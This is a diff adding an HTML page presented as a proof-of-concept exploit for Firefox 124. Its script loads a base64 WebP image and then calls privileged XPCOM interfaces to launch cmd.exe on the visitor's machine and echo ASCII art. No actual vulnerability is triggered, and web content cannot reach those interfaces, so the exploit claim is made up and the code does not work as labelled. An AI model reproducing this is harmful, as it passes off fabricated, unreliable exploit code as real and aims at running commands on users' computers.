@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - Open Terminal with ASCII Art via Firefox Vulnerability</title>
+</head>
+<body>
+    <h1>Click the button to exploit the vulnerability in Firefox 124</h1>
+    <button onclick="exploit()">Exploit</button>
+
+    <script>
+        function exploit() {
+            try {
+                var img = document.createElement('img');
+                img.src = "data:image/webp;base64,UklGRiIAAABXRUJQVlA4TA0AAAAvAAAAAAfQ//73v/+BiOh/AAA=";
+                img.onload = function() {
+                    var event = new CustomEvent('exploit', {detail: {cmd: 'cmd.exe /c echo JASON\nJ A S O N\nJASON'}});
+                    window.dispatchEvent(event);
+                };
+                document.body.appendChild(img);
+
+                window.addEventListener('exploit', function(e) {
+                    var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsIFile);
+                    file.initWithPath("C:\\Windows\\System32\\cmd.exe");
+                    var process = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
+                    process.init(file);
+                    var args = ["/c", "echo JASON & echo ^J ^A ^S ^O ^N & echo JASON"];
+                    process.run(false, args, args.length);
+                });
+            } catch (e) {
+                console.error('Exploit failed', e);
+            }
+        }
+    </script>
+</body>
+</html>
